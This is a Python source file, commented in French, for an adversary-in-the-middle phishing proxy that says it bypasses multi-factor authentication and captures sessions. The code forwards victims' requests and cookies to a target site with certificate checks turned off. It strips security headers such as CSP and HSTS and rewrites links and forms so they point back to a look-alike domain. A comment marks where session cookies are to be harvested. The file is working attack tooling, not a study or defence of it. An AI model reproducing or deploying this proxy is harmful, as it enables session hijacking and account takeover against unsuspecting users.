import aiohttp
import asyncio
from typing import Dict, Optional, Tuple
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from fastapi import Request, Response, HTTPException

class AiTMProxy:
    """
    Adversary-in-the-Middle (AiTM) Proxy Engine v5
    Intercepte et réécrit le trafic pour contourner le MFA et capturer les sessions.
    """
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.proxy_domain = "vantablack-proxy.com" # À configurer dynamiquement

    async def get_session(self) -> aiohttp.ClientSession:
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                auto_decompress=False # On veut gérer la décompression nous-mêmes si besoin
            )
        return self.session

    async def proxy_request(self, target_url: str, request: Request, body: bytes = None) -> Response:
        """
        Proxy la requête vers le serveur cible et réécrit la réponse.
        """
        session = await self.get_session()
        
        # Nettoyage des headers (suppression de l'hôte d'origine, compression, etc.)
        headers = dict(request.headers)
        headers.pop("host", None)
        headers.pop("content-length", None)
        headers["user-agent"] = headers.get("user-agent", "Mozilla/5.0") # Fail-safe
        
        method = request.method
        cookies = request.cookies
        
        try:
            async with session.request(
                method, 
                target_url, 
                headers=headers, 
                data=body, 
                cookies=cookies,
                allow_redirects=False # On gère les redirections manuellement
            ) as upstream_response:
                
                content = await upstream_response.read()
                response_headers = dict(upstream_response.headers)
                
                # Suppression des headers de sécurité qui bloqueraient le framing/proxying
                for h in ["content-security-policy", "x-frame-options", "strict-transport-security"]:
                    response_headers.pop(h, None)
                
                # Réécriture du contenu si c'est du HTML/Texte
                content_type = response_headers.get("content-type", "")
                if "text/html" in content_type:
                    content = self.rewrite_html(content, target_url)
                    # Mise à jour content-length après réécriture
                    response_headers.pop("content-length", None)
                    # response_headers["content-length"] = str(len(content)) # Pas obligatoire avec chunked
                
                # Capture des Set-Cookie (MFA Bypass)
                # TODO: Stocker dans Redis via SessionManager
                
                return Response(
                    content=content,
                    status_code=upstream_response.status,
                    headers=response_headers,
                    media_type=content_type
                )
                
        except Exception as e:
            # En prod, logger l'erreur discrètement
            print(f"[AiTM Error] {e}")
            raise HTTPException(status_code=502, detail="Upstream Error")

    def rewrite_html(self, html_content: bytes, base_url: str) -> bytes:
        """
        Réécrit les liens et formulaires pour qu'ils pointent vers le proxy.
        """
        try:
            soup = BeautifulSoup(html_content, "html.parser")
            
            # Réécriture des liens (a href)
            for tag in soup.find_all("a", href=True):
                tag["href"] = self._rewrite_url(tag["href"], base_url)
                
            # Réécriture des formulaires (form action)
            for tag in soup.find_all("form", action=True):
                tag["action"] = self._rewrite_url(tag["action"], base_url)
                
            # Réécriture des ressources statiques (img src, script src, link href)
            # Pour l'instant on laisse les statiques pointer vers l'original pour alléger la charge
            # Sauf si on veut éviter le mixed content ou les fuites de referrer
            
            return str(soup).encode("utf-8")
        except Exception:
            return html_content

    def _rewrite_url(self, url: str, base_url: str) -> str:
        """
        Transforme une URL cible en URL proxy.
        """
        # Si lien absolu vers le domaine cible -> remplacer par notre domaine
        full_url = urljoin(base_url, url)
        parsed = urlparse(full_url)
        
        # Logique simplifiée : tout passe par /proxy?url=... ou via sous-domaine
        # Pour V5, on utilisera une approche plus furtive (mapping de routes)
        # Ici on retourne le chemin relatif pour rester sur le proxy
        return parsed.path + ("?" + parsed.query if parsed.query else "")

    async def close(self):
        if self.session:
            await self.session.close()

# Instance globale
aitm_proxy = AiTMProxy()
